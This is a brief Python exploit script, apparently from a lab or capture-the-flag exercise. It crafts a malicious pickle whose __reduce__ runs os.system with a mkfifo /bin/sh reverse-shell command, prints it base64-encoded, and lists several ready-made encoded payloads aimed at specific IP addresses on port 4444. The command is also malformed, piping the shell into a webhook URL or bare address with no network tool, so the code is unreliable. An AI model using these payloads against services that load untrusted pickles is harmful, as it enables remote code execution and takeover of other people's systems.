import pickle
import sys
import base64

command = "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | https://webhook.site/b1c99976-f33f-46e5-99ac-7cdda3a35de9 > /tmp/f"

class rce(object):
    def __reduce__(self):
        import os
        return (os.system,(command,))

print(base64.b64encode(pickle.dumps(rce())))

# gASVbgAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjFNybSAvdG1wL2Y7IG1rZmlmbyAvdG1wL2Y7IGNhdCAvdG1wL2YgfCAvYmluL3NoIC1pIDI+JjEgfCAgMTAuMS41My4xOTYgNDQ0NCA+IC90bXAvZpSFlFKULg==

# 10.2.32.50 4444
# gANjcG9zaXgKc3lzdGVtCnEAWFEAAABybSAvdG1wL2Y7IG1rZmlmbyAvdG1wL2Y7IGNhdCAvdG1wL2YgfCAvYmluL3NoIC1pIDI+JjEgfCAxMC4yLjMyLjUwIDQ0NDQgPiAvdG1wL2ZxAYVxAlJxAy4=

# 10.1.26.207
# gANjcG9zaXgKc3lzdGVtCnEAWFIAAABybSAvdG1wL2Y7IG1rZmlmbyAvdG1wL2Y7IGNhdCAvdG1wL2YgfCAvYmluL3NoIC1pIDI+JjEgfCAxMC4xLjI2LjIwNyA0NDQ0ID4gL3RtcC9mcQGFcQJScQMu


# gASVbQAAAAAAAACMAm50lIwGc3lzdGVtlJOUjFVybSAvdG1wL2Y7IG1rZmlmbyAvdG1wL2Y7IGNhdCAvdG1wL2YgfCAvYmluL3NoIC1pIDI+JjEgfCA1NC4yMTkuMjA1LjEyNCA0NDQ0ID4gL3RtcC9mlIWUUpQu